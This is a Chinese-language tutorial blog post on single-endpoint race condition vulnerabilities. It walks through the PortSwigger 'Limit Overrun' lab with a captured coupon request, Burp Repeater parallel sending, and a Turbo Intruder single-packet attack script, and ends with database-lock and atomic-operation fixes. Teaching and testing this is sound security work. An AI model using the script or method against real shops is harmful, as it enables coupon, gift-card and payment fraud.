#  Web安全之一文搞懂单端点条件竞争漏洞  
原创 流岁金沙
                        流岁金沙  迷雾光航   2026-05-14 05:11  
  
# Web安全：单端点条件竞争漏洞详解  
> **导读**  
：本文深入解析单端点条件竞争漏洞的原理、危害及挖掘方法，结合 PortSwigger 官方靶场实战演示，附赠实用工具清单。  
  
## 一、漏洞简介  
### 什么是条件竞争？  
  
**条件竞争（Race Condition）**  
 漏洞是一种由于系统处理并发请求时的时间窗口问题导致的安全缺陷。  
  
当多个请求同时到达服务器，且服务器在处理这些请求时存在「**检查后使用**  
」（Check-Then-Use）的逻辑缺陷，攻击者可以利用请求之间的时序差异，绕过原本的安全限制。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Jql0Y1qckZTeq4Kx0aULSgNrJTcic6u2fGF7LxBXKFIQuPl2IogCtARrazdkv0eQFUSe9APZoQ4tvVyfd12mYRFWnuDLwiaW5DBQ0kbzevoTs/640?wx_fmt=png&from=appmsg "")  
  
### 单端点 vs 多端点  
<table><thead><tr><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">类型</span></section></th><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">特征</span></section></th><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">攻击难度</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><strong style="color: rgb(72, 112, 172);"><span leaf="">单端点</span></strong></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">仅向同一接口发送并发请求</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">⭐⭐⭐</span></section></td></tr><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><strong style="color: rgb(72, 112, 172);"><span leaf="">多端点</span></strong></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">需协调多个不同接口</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">⭐⭐⭐⭐</span></section></td></tr></tbody></table>> 💡 **单端点条件竞争**  
：攻击者仅通过向**同一个接口**  
发送大量并发请求实现攻击，隐蔽性高、危害范围广。  
  
## 二、常见危害场景  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Jql0Y1qckZTBKrrfs3X6bO96ITuRtCNaNk0U1hgy2X6sh2ejAiaCf1rtfEK7icNu0WAatnWNaco28CQTE20X0VIhfmYAFvpWAwVoYGCfxTI8A/640?wx_fmt=png&from=appmsg "")  
###   
  
  
### 实际案例  
<table><thead><tr><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">场景</span></section></th><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">漏洞表现</span></section></th><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">危害程度</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">电商折扣码</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">一次使用多次生效</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">💰💰💰</span></section></td></tr><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">礼品卡兑换</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">重复兑换</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">💰💰💰💰</span></section></td></tr><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">积分获取</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">超出限制领取</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">💰💰</span></section></td></tr><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">API频率限制</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">暴力破解</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">💰💰💰💰💰</span></section></td></tr></tbody></table>## 三、漏洞原理  
### 核心：时间窗口（Time Window）  
  
单端点条件竞争的本质是 **「检查-使用」时间窗口**  
。  
  
在单线程逻辑中看似安全的代码：  
```
# 看似安全的领取逻辑def claim_coupon(user_id, coupon_id):    if not user_has_claimed(user_id, coupon_id):  # 检查        add_claim_record(user_id, coupon_id)        # 使用        return "领取成功"    return "已领取过"
```  
  
在并发环境下可能变成：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jql0Y1qckZQoCOWdj9Wib4JvOEtTSyh0SyoN5GAhvmTOUcAvV0nkO097MyQ9SH04ibInVuGcoX9RPpmKg0RKKnzgiccTWYInFFrIrICianTEvQg/640?wx_fmt=png&from=appmsg "")  
  
  
###   
## 四、如何查找漏洞  
### 1. 识别潜在攻击点  
  
🎯 **关键特征**  
：任何涉及「先检查后操作」的功能都是潜在目标。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jql0Y1qckZReHiatxE1SUC2VDO7aibv5LEFrEXXx43n2kHoEkX2MXKC0MpsdvocVJAEcvZm8s1iaKic3v7OJdmdB6TTDibnB8qLmtOztOkVPDGKQ/640?wx_fmt=png&from=appmsg "")  
  
### 2. 测试方法  
  
**第一步**  
：识别并发点  
```
检查请求是否涉及：├── 用户状态检查（已领取/未领取）├── 资源配额检查（次数/限额）├── 条件判断（余额/库存）└── 时间窗口（支付/确认分离）
```  
  
**第二步**  
：构造并发请求  
  
**BurpSuite Repeater 操作流程**  
：  
```
1. Ctrl+R 复制请求 → 复制 20+ 个标签页2. 选中所有标签页 → 右键3. "Send group in parallel" → 并行发送4. 观察响应结果差异
```  
  
在repeater中新建一个请求组，ctrl+r复制请求，然后点击  
Send group in parallel就能并行发送  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Jql0Y1qckZRvR26dD9gxNLSoONIKVRZP8tuCp9hibldh0sG8kMzz0hPS4ia0eRPNmuO2kGDrsApWuGCquLGvpWYLMvFfGWbdaDXtw6LrucWuk/640?wx_fmt=png&from=appmsg "")  
```

```  
  
**第三步**  
：对比分析  
<table><thead><tr><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">发送方式</span></section></th><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">预期结果</span></section></th><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">实际结果（漏洞）</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">顺序发送</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">仅1次成功</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">-</span></section></td></tr><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">并行发送</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">仅1次成功</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><strong style="color: rgb(72, 112, 172);"><span leaf="">多次成功</span></strong><section><span leaf=""> ← 漏洞！</span></section></td></tr></tbody></table>### 3. 判断技巧  
```
┌────────────────────────────────────────────────────┐│              漏洞存在判断标准                       │├────────────────────────────────────────────────────┤│                                                    ││  🔍 顺序测试：仅第1个请求成功                      ││  🔍 并发测试：多个请求成功                         ││  🔍 差异存在：证明存在竞争窗口                     ││                                                    ││  满足以上三点 → 漏洞确认！                         ││                                                    │└────────────────────────────────────────────────────┘
```  
### 4. 常用工具  
<table><thead><tr><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">工具</span></section></th><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">适用场景</span></section></th><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">推荐指数</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><strong style="color: rgb(72, 112, 172);"><span leaf="">Turbo Intruder</span></strong></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">精细控制并发参数</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">⭐⭐⭐⭐⭐</span></section></td></tr><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><strong style="color: rgb(72, 112, 172);"><span leaf="">Burp Repeater</span></strong></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">快速验证</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">⭐⭐⭐⭐</span></section></td></tr><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><strong style="color: rgb(72, 112, 172);"><span leaf="">OWASP ZAP</span></strong></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">基础并发测试</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">⭐⭐⭐</span></section></td></tr><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><strong style="color: rgb(72, 112, 172);"><span leaf="">Python asyncio</span></strong></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">自定义批量测试</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">⭐⭐⭐⭐</span></section></td></tr></tbody></table>## 五、实战测试  
### 测试环境  
```
🛠️ Burpsuite v2026.4🛠️ Turbo Intruder v1.6.2🎯 靶场：PortSwigger Lab - Limit Overrun Race Conditions
```  
### 靶场目标  
> 以非正常价格购买价值 **$1337.00**  
 的夹克  
  
### 测试过程  
#### 步骤1：正常流程测试  
1. 登录账户 wiener/peter  
（默认50美元）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Jql0Y1qckZQKzW1Oic3ucv4upxCB5edrXblt96hYkzvtcwnuNAlb8MW9IVqQnhNSibnH2gj3jHnHJVPBBPcfpvH5m3E6g0QPFRkf8QyOhZib4g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Jql0Y1qckZRMbVWe9icvIcca1ESzs7eE6rHMhy34b761hmm0VNbTBicribR6eWtLf0FjWRSv4dTiaFjggU8bUmw4ORL9869OU4kgVN1iaLmlAknI/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
1. 添加夹克到购物车  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Jql0Y1qckZQhOqicLbRiaCbsOfH1D03ic6ZKveqY7JgKrIlDVrTBoqjmcukmMmMUTnIhgyUPqq1sicjxict3fXFYMKfiarsVJI7qOeABXuw61vYicA/640?wx_fmt=png&from=appmsg "")  
  
  
1. 使用优惠券 PROMO20  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jql0Y1qckZSlib3KS1JLviaFDiaZ0mFTl4khqqm6XibMwc1cpnCG8pFuMgvZzms66KniboB9lH3OiaxP98kYJkmOAibsVMVoXnEdWm9wGJGk7hvsdk/640?wx_fmt=png&from=appmsg "")  
  
  
1. 观察响应：Coupon applied  
 或 Coupon already applied  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jql0Y1qckZQ3FpDO5RQZ65eVdDKFdryvaG8KqYK828fuxFMmzfLXR6VX9Kpq9l5oOsWAJ4pofEGSMvzY1uGu41hSdjCfe2Uk1LU661I6gV0/640?wx_fmt=png&from=appmsg "")  
  
  
#### 步骤2：识别请求  
  
  
```
POST /cart/coupon HTTP/2
Host: 0a1100fa04a276d78002586000de0015.web-security-academy.net
Cookie: session=X2SRMa5aL3NjsB95oQMyIn2EguISJuVR
Content-Length: 52
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Origin: https://0a1100fa04a276d78002586000de0015.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1100fa04a276d78002586000de0015.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Dnt: 1
Sec-Gpc: 1
Priority: u=0, i
csrf=JU9MVy4qTw5WCOgMmp1fgfPmWhJ0ZPid&coupon=PROMO20
```  
  
#### 步骤3：并发攻击  
  
**方法A - Repeater 单包攻击**  
：  
  
- 首先移除优惠  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jql0Y1qckZQo05JpKIrXyr686TnbWrqmIgoSbtLjHnYbjGfUXyzmxL4nicRVvcSYbXz8FKUYekPBySQia5Qs0bBqEsywh5FHDHWjMLNAWrNtM/640?wx_fmt=png&from=appmsg "")  
  
否则继续使用优惠券就会出现如下的情况，显示优惠券已经使用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jql0Y1qckZSDWLRdXQcOxicrsUvibqGOjjgjqnWfXJ5Rev3xaLOOU3NE2fia3NhNsetbtV4XaxyLAaDT7jwp3m8JU7PTdGuNjsM1NNhKmL5R14/640?wx_fmt=png&from=appmsg "")  
  
  
- 在repeater模块新建一个一个组，并且将使用优惠券的数据包发送到组中，使用ctrl+r复制10个，点击发送send group in parallel  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jql0Y1qckZR2jtJnBTWW5AEpqaoHJibwZXL0IFYjXKq7iaDkyo8YX6Mic9PzQM73iaBxy744cRLxOkO0omB3vwFgVq9RAlfWtI9B3vc1CicDqZ6Y/640?wx_fmt=png&from=appmsg "")  
  
  
查看log，发现成功了8个  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Jql0Y1qckZS6bPUf3yVFCy7ATb9wckWo98Fgcqys48aAW9qicXd5hYmGnDxxT2cFqy4mV2C6Hfzjlt2VbpdvtKZ1wECUEAnYyNmW3zn3qpUg/640?wx_fmt=png&from=appmsg "")  
  
这里就说明存在并发漏洞，绕过了只能使用一次的限制  
  
但是仍然买不起  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Jql0Y1qckZSQWEM0lOV1UvXQOF7lDGYl3JNFj6h1pR0BWKu6Y2Q9Nm6yhEJr73cT05Z75JvjQ6bhNVbS2OcAZMkFrE0Ds8A1Ml7al8iaQTaY/640?wx_fmt=png&from=appmsg "")  
  
  
- 继续移除优惠券后一次性发送20个  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jql0Y1qckZSQGQ30jcP5L1oTOUsWYSTo37UmEPvGcRl5T8U1AhQ6W99Q3Jx3EziaRsD1fVWIjF0qaWuBeJ5Rs5a6ObcbiaU9DcaxLFDmawSWE/640?wx_fmt=png&from=appmsg "")  
  
成功优惠到可以购买的价格（因为网络波动会影响实验结果，可以多试几次），成功购买  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jql0Y1qckZSBq1BbRqAa2ruQvvchFNDdBLTmE8LqFiax1o0p2JrDSuNTdSc2lOP74Ry0SV6LoxaH6DOibibh2ibS9UricA8ibhGNCuveiaBIYe2eNg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
**方法B - Turbo Intruder 脚本**  
：  
  
这里使用单包发送的脚本的成功率比较高  
```
def queueRequests(target, wordlists):
    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for i in range(20):
        engine.queue(target.req, gate='race1')
    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')
def handleResponse(req, interesting):
    table.add(req)
```  
  
上面的步骤和之前的一样，直接到使用脚本这一步  
  
- 将使用优惠券的数据包发送到turbo intruder插件，并且使用自带的race-single-packet-attach.py脚本（注意：这里的http协议必须是http/2）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jql0Y1qckZQMa00SIxS3qicckF5ib4Uiay7dMA4oXuWOxXEJAQ5XZib5XS4iaBf847hcIOLAaMVv2xUOrFZ1ibGFZltfMc5BNnNSEic04AeYOpPfpw/640?wx_fmt=png&from=appmsg "")  
  
  
- 点击attack开始攻击  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jql0Y1qckZThNiaQJBGOXTiaicbGvPfDLVahCrgvWFdfOzZLXE5ns9Pd6RSicSxLJFw1VGMUovGqTYdljjvFBZhulxJsPIgUITkkRHycKf03q7I/640?wx_fmt=png&from=appmsg "")  
  
成功10个  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Jql0Y1qckZSruTrV9Ssoibq0oxW4BV6valAuQsaKkgQ5mic0lgr5FLMiamNw2jOLxGkjScQjwKeTt88rhC5pmqMO42cwibZntic2ZDYfXCLqG7Mc/640?wx_fmt=png&from=appmsg "")  
  
  
## 六、修复建议  
### 方案一：数据库锁  
```
-- 使用悲观锁BEGIN TRANSACTION;SELECT * FROM coupons WHERE user_id=? AND coupon_id=? FOR UPDATE;-- 检查并插入INSERT INTO claims...;COMMIT;
```  
### 方案二：唯一约束  
```
-- 添加数据库唯一索引ALTER TABLE claims ADD UNIQUE (user_id, coupon_id);
```  
### 方案三：原子操作  
```
# 避免 Check-Then-Act，使用原子操作def claim_coupon_atomic(user_id, coupon_id):    rows = db.execute("""        INSERT INTO claims (user_id, coupon_id)         VALUES (?, ?)         ON CONFLICT(user_id, coupon_id) DO NOTHING        RETURNING 1    """, user_id, coupon_id)    return rows > 0
```  
### 方案四：分布式锁  
```
import redislock = redis.lock(f"coupon:{user_id}:{coupon_id}", timeout=10)if lock.acquire(blocking=True):    try:        # 业务逻辑        use_coupon()    finally:        lock.release()
```  
## 七、总结  
```
┌─────────────────────────────────────────────────────────────┐│                      知识回顾                              │├─────────────────────────────────────────────────────────────┤│                                                             ││  📌 原理：检查-使用时间窗口                                 ││                                                             ││  📌 特征：单端点、并发请求、检查后使用                       ││                                                             ││  📌 危害：权限绕过、优惠券滥用、库存超卖、频率限制          ││                                                             ││  📌 检测：顺序测试 vs 并行测试对比                         ││                                                             ││  📌 修复：数据库锁、唯一约束、原子操作、分布式锁            ││                                                             │└─────────────────────────────────────────────────────────────┘
```  
## 参考链接  
  
📚 **官方文档**  
：  
- PortSwigger - Race Conditions[1]  
  
- PortSwigger Lab - Limit Overrun[2]  
  
📖 **本文参考**  
：  
- NOA Blog - Web 安全：条件竞争漏洞[3]  
  
**🔒 声明**  
：本文仅供安全研究和技术交流，渗透测试请确保获得合法授权。  
### 引用链接  
  
[1]  
PortSwigger - Race Conditions: https://portswigger.net/web-security/race-conditions  
  
[2]  
PortSwigger Lab - Limit Overrun: https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun  
  
[3]  
NOA Blog - Web 安全：条件竞争漏洞: https://noa.pages.dev/posts/web_security/race_conditions/  
  
